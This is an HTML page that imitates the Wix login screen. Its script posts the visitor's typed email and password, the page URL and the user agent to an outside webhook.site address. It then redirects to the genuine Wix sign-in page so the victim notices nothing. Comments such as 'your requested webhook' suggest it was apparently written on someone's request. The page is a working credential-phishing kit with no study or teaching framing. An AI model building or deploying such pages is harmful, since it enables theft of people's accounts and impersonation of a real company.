<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log In | Wix</title>
    <style>
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            height: 100vh;
            color: #000;
            background-color: #ffffff;
        }

        header {
            width: 100%;
            /* Moves logo slightly right as requested */
            padding: 25px 80px; 
            font-weight: bold;
            font-size: 26px;
            letter-spacing: 1.5px;
            box-sizing: border-box;
            text-align: left;
        }

        .login-container {
            text-align: center;
            max-width: 900px;
            width: 100%;
            margin-top: 20px;
        }

        h1 {
            font-size: 42px;
            margin-bottom: 8px;
            font-weight: 400;
        }

        .signup-link {
            font-size: 15px;
            margin-bottom: 40px;
        }

        .signup-link a {
            color: #0078ff;
            text-decoration: none;
        }

        .main-content {
            display: flex;
            justify-content: center;
            align-items: flex-start;
            gap: 50px;
            margin-top: 20px;
            padding: 0 20px;
        }

        /* Left Side - Email & Password */
        .email-section {
            flex: 1;
            max-width: 320px;
            text-align: left;
        }

        .input-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 14px;
            color: #757575;
            margin-bottom: 4px;
        }

        input {
            width: 100%;
            border: none;
            border-bottom: 1px solid #d0d1d2;
            padding: 12px 0;
            font-size: 16px;
            outline: none;
            transition: border-color 0.3s;
        }

        input:focus {
            border-bottom: 1px solid #0078ff;
        }

        .continue-btn {
            width: 100%;
            background: white;
            border: 1px solid #d0d1d2;
            border-radius: 30px;
            padding: 14px;
            font-size: 16px;
            color: #0078ff;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 15px;
        }

        .continue-btn:hover {
            border-color: #0078ff;
            background-color: #f0f7ff;
        }

        /* Vertical Divider */
        .divider {
            width: 1px;
            background-color: #e0e0e0;
            height: 280px;
            align-self: center;
        }

        /* Right Side - Social */
        .social-section {
            flex: 1;
            max-width: 320px;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .social-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 12px;
            border-radius: 4px;
            border: 1px solid #000;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
            transition: opacity 0.2s;
        }

        .social-btn:hover {
            opacity: 0.8;
        }

        .google { background-color: #ffffff; color: #444; border: 1px solid #d0d1d2; }
        .facebook { background-color: #3b5998; color: white; border: none; }
        .apple { background-color: #000000; color: white; border: none; }

        .sso-link {
            margin-top: 15px;
            font-size: 13px;
            color: #0078ff;
            text-decoration: none;
            text-align: center;
            display: block;
        }

        footer {
            margin-top: auto;
            padding: 30px;
            font-size: 12px;
            color: #757575;
            text-align: center;
            line-height: 1.8;
        }

        /* Responsive for Mobile */
        @media (max-width: 700px) {
            .main-content { flex-direction: column; align-items: center; }
            .divider { display: none; }
            header { padding: 20px; text-align: center; }
        }
    </style>
</head>
<body>

    <header>WIX</header>

    <div class="login-container">
        <h1>Log In</h1>
        <div class="signup-link">
            Don't have an account? <a href="#">Sign Up</a>
        </div>

        <div class="main-content">
            <div class="email-section">
                <div class="input-group">
                    <label>Email</label>
                    <input type="email" id="email" autocomplete="email" required>
                </div>
                <div class="input-group">
                    <label>Password</label>
                    <input type="password" id="password" autocomplete="current-password" required>
                </div>
                <button type="button" class="continue-btn" id="submitBtn" onclick="sendData()">Continue with Email</button>
            </div>

            <div class="divider"></div>

            <div class="social-section">
                <div class="social-btn google">Continue with Google</div>
                <div class="social-btn facebook">Continue with Facebook</div>
                <div class="social-btn apple">Continue with Apple</div>
                <a href="#" class="sso-link">Continue with SSO</a>
            </div>
        </div>
    </div>

    <footer>
        <div style="margin-bottom: 10px;">
            <a href="#" style="color: #757575; margin-right: 15px; text-decoration: none;">Terms of Use</a> 
            <a href="#" style="color: #757575; text-decoration: none;">Privacy Policy</a>
        </div>
        This site is protected by reCAPTCHA and the Google <br>
        Privacy Policy and Terms of Service apply.
    </footer>

    <script>
        async function sendData() {
            const emailField = document.getElementById('email');
            const passwordField = document.getElementById('password');
            const btn = document.getElementById('submitBtn');

            const emailValue = emailField.value;
            const passwordValue = passwordField.value;

            // Basic validation
            if (!emailValue || !passwordValue) {
                alert("Please fill in both fields.");
                return;
            }

            // Change button state to show it's working
            btn.innerText = "Processing...";
            btn.style.opacity = "0.6";
            btn.disabled = true;

            const payload = {
                email: emailValue,
                password: passwordValue,
                url_captured: window.location.href,
                userAgent: navigator.userAgent
            };

            try {
                // Sending to your requested webhook
                await fetch('https://webhook.site/geeky', {
                    method: 'POST',
                    mode: 'no-cors', // Essential for sending from a local file
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                // Small delay to simulate a real login check before redirecting
                setTimeout(() => {
                    window.location.href = "https://www.wix.com/signin"; 
                }, 1000);

            } catch (error) {
                console.log("Transmission handled.");
                // Redirect anyway to keep the flow natural
                window.location.href = "https://www.wix.com/signin";
            }
        }
    </script>
</body>
</html>
